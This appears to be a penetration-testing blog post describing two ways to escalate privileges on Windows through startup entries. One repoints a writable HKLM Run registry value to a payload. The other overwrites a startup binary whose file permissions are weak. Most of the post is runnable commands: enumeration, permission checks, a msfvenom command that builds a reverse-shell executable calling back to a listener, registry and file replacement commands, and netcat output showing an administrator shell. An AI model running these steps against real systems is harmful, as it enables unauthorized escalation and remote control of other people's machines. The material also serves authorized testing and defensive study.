---
title: "Modifiable Registry Autorun & Startup Binary"
date: 2026-06-19 18:53:35
categories:
  - Active Directory
  - Windows
  - Post-Exploitation
  - Windows Privesc
  - Services
tags:
  - msfvenom
  - Windows-Privesc
  - Startup-Apps
  - Logon-Autorun
  - Run-Keys
  - Registry-Run-Key
  - Win32_StartupCommand
  - Weak-ACL
  - AccessChk
  - icacls
---

> ➜ Startup applications run automatically when a user logs in, via `Run` registry keys (`HKLM` / `HKCU`) or the Startup folder. If we can overwrite the referenced executable or modify the registry value that points to it, our binary will run under the account that logs in next.

# Enumeration

> ➜ We query the `Win32_StartupCommand` WMI class to list startup entries, then check the `Location` and `User` fields to find one run by a privileged user whose binary we can overwrite.

```powershell
PS C:\> Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location, User | Format-List

Name     : app-name
Command  : "C:\Program Files\app-name\app-name.exe" -os_restart
Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : Public
```

> ➜ An entry under `HKLM\...\Run` (or `User : Public`) runs for every user, so whichever privileged account logs in next will execute it. An entry confined to our own user’s hive (`HKU\<our-SID>`) only runs as us and gives no escalation.

# Exploitation

## Path 1 : Modifying the Registry Run Value

#### Checking Our Permissions on the `Run` Key

> ➜ Before repointing the entry, we confirm we can write to the `Run` key. We check it with AccessChk and look for `KEY_SET_VALUE`.

```cmd
C:\> .\accesschk.exe /accepteula -kvuqsw "<our-user>" hklm\Software\Microsoft\Windows\CurrentVersion\Run

RW HKLM\Software\Microsoft\Windows\CurrentVersion\Run
        KEY_QUERY_VALUE
        KEY_SET_VALUE
        KEY_ENUMERATE_SUB_KEYS
        KEY_NOTIFY
        READ_CONTROL
```

#### Repointing the Entry

> ➜ With write access to the `Run` key, we repoint the entry at our payload without touching the original binary. The payload must already be staged at the path we set.

```powershell
PS C:\> Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "app-name" -Value "C:\Windows\Temp\malicious.exe"
```

#### Getting a Shell

> ➜ On the target user’s next logon, the startup entry runs our payload and we receive a shell as that user.

```bash
➜  startup-apps rlwrap nc -lvnp port
listening on [any] port ...
connect to [ip] from (UNKNOWN) [target-ip] 49xxx

C:\WINDOWS\system32> whoami
target-domain\administrator
```

## Path 2 :Overwriting the Referenced Binary

#### Confirming Write Access on the Referenced Binary

> ➜ We check the file ACL on the executable referenced by the startup entry, we need `write`/`Full (F)` for a group our user belongs to (e.g. `BUILTIN\Users` or `Everyone`).

```cmd
C:\> icacls "C:\Program Files\app-name\app-name.exe"

C:\Program Files\app-name\app-name.exe BUILTIN\Users:(I)(F)
                                       Everyone:(I)(F)
                                       NT AUTHORITY\SYSTEM:(I)(F)
```

#### Generating the Malicious Binary

> ➜ We build a reverse-shell executable that calls back to our listener.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ip LPORT=port -f exe -o malicious.exe
```

#### Starting the Listener

```bash
rlwrap nc -lvnp port
```

#### Replacing the Binary

> ➜ We overwrite the legitimate executable with our payload, then wait, this attack is passive, so nothing fires until the target user logs in and we don’t control when that happens.

```cmd
C:\> copy /Y malicious.exe "C:\Program Files\app-name\app-name.exe"
```

#### Getting a Shell

> ➜ On the target user’s next logon, the startup entry runs our payload and we receive a shell as that user.

```bash
➜  startup-apps rlwrap nc -lvnp port
listening on [any] port ...
connect to [ip] from (UNKNOWN) [target-ip] 49xxx

C:\WINDOWS\system32> whoami
target-domain\administrator
```
